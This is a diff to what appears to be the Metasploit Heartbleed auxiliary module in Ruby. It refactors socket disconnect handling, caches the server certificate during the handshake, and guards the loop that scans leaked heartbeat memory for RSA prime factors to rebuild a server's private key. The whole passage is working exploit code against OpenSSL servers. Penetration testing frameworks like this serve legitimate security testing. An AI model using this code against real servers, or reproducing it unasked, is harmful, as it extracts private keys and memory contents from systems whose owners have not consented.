@@ -323,8 +323,9 @@ class Metasploit3 < Msf::Auxiliary
     else
       #Shouldn't get here, since Action is Enum
       print_error("Unknown Action: #{action.name}")
-      return
     end
+
+    disconnect
   end
 
   def bleed
@@ -355,19 +356,16 @@ class Metasploit3 < Msf::Auxiliary
         msg = "Protocol error. Looks like the chosen protocol is not supported."
       end
       vprint_error("#{peer} - #{msg}")
-      disconnect
       return
     end
 
     unless type == HEARTBEAT_RECORD_TYPE && version == TLS_VERSION[datastore['TLS_VERSION']]
       vprint_error("#{peer} - Unexpected Heartbeat response")
-      disconnect
       return
     end
 
     heartbeat_data = sock.get(heartbeat_length) # Read the magic length...
     vprint_status("#{peer} - Heartbeat response, #{heartbeat_data.length} bytes")
-    disconnect
     heartbeat_data
   end
 
@@ -409,12 +407,7 @@ class Metasploit3 < Msf::Auxiliary
 
   end
 
-  def getkeys()
-    unless datastore['TLS_CALLBACK'] == 'None'
-      print_error('TLS callbacks currently unsupported for keydumping action') #TODO
-      return
-    end
-
+  def getkeys
     print_status("#{peer} - Scanning for private keys")
     count = 0
 
@@ -435,7 +428,10 @@ class Metasploit3 < Msf::Auxiliary
         print_status("#{peer} - #{Time.now.getutc} - Attempt #{count}...")
       end
 
-      p, q = get_factors(bleed, n) # Try to find factors in mem
+      bleedresult = bleed
+      return unless bleedresult
+
+      p, q = get_factors(bleedresult, n) # Try to find factors in mem
 
       unless p.nil? || q.nil?
         key = key_from_pqe(p, q, e)
@@ -612,6 +608,8 @@ class Metasploit3 < Msf::Auxiliary
       vprint_debug("\t\t\tCertificate ##{cert_counter}: Length: #{single_cert_len}")
       certificate_data = data[(start + 3), single_cert_len]
       cert = OpenSSL::X509::Certificate.new(certificate_data)
+      # First received certificate is the one from the server
+      @cert = cert if @cert.nil?
       #vprint_debug("Got certificate: #{cert.to_text}")
       vprint_debug("\t\t\tCertificate ##{cert_counter}: #{cert.inspect}")
       already_read = already_read + single_cert_len + 3
@@ -626,17 +624,12 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def get_ne()
-    # Fetch rhost's cert, return public key values
-    connect(true, {"SSL" => true}) #Force SSL
-    cert  = OpenSSL::X509::Certificate.new(sock.peer_cert)
-    disconnect
-
-    unless cert
+    unless @cert
       print_error("#{peer} - No certificate found")
       return
     end
 
-    return cert.public_key.params["n"], cert.public_key.params["e"]
+    return @cert.public_key.params["n"], @cert.public_key.params["e"]
   end
 
   def get_factors(data, n)
@@ -678,7 +671,6 @@ class Metasploit3 < Msf::Auxiliary
     server_hello = sock.get(response_timeout)
     unless server_hello
       vprint_error("#{peer} - No Server Hello after #{response_timeout} seconds...")
-      disconnect
       return nil
     end
 
